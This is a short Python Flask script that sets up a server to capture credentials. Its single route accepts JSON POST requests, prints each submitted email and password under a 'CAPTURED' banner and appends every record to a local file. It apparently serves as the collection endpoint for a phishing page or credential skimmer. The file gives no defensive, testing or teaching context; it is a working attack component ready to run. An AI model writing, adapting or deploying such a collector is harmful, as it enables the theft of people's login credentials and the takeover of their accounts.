from flask import Flask, request, jsonify
import json
from datetime import datetime

app = Flask(__name__)
app.config["MAX_CONTENT_LENGTH"] = 12 * 1024 * 1024  # 12 MB


@app.route('/', methods=['POST', 'GET'])
def capture():
    if request.method == 'POST':
        try:
            data = request.get_json()
            print(f"\n[✅ CAPTURED] {datetime.now()}")
            print(f"Email: {data.get('email')}")
            print(f"Password: {data.get('password')}")
            print(f"Timestamp: {data.get('timestamp')}")
            
            # Optionally save to file
            with open('captured.txt', 'a') as f:
                f.write(f"{datetime.now()} | {data}\n")
            
            return jsonify({"status": "received"}), 200
        except Exception as e:
            print(f"Error: {e}")
            return jsonify({"status": "error"}), 400
    
    return "Server running. Send POST requests to capture data."

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)